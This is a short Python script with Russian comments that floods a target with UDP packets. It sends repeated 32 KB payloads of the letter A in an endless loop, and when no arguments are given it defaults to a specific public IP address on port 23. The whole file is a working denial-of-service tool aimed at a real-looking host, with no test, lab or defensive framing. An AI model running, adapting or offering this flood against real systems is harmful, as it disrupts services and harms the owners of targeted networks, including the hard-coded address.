import socket 
import argparse
import sys

def send_packets(target_ip, target_port, packet_size, num_packets):
    try:
        # Создаем UDP-сокет
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        print(f"Отправка {num_packets} пакетов на {target_ip}:{target_port} размером {packet_size} байт...")
        
        # Создаем пакет данных
        data = b"A" * packet_size
        
        # Отправляем пакеты
        for i in range(num_packets):
            sock.sendto(data, (target_ip, target_port))
            print(f"Пакет {i + 1} отправлен")
        
        print("Отправка завершена.")
    except Exception as e:
        print(f"Ошибка: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Скрипт отправки UDP пакетов")
    parser.add_argument("ip", type=str, help="Целевой IP-адрес")
    parser.add_argument("port", type=int, help="Целевой порт")
    parser.add_argument("size", type=int, help="Размер пакета в байтах")
    parser.add_argument("count", type=int, help="Количество пакетов")

    # Установите значения по умолчанию, если аргументы не переданы
    args = parser.parse_args(args=None if sys.argv[1:] else ["176.226.174.166", "23", "32768", "5000"])
    
    try:
        while True:  # Бесконечный цикл
            send_packets(args.ip, args.port, args.size, args.count)
    except KeyboardInterrupt:
        print("\nПрограмма остановлена пользователем.")
